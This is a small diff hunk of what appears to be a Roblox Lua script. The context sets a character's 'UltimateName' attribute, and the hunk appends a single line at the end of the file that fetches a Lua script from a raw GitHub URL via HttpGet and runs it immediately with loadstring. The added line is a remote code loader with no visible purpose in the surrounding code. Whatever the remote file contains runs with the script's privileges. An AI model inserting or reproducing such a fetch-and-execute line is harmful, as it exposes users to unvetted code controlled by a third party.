@@ -832,4 +832,7 @@ pcall(function()
     if char then char:SetAttribute("UltimateName", "REVENGE") end
 end)
 
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/avraampetrov11-creator/PlaZRoblox/main/ShucksM1.lua"))()
+
 -- End of file
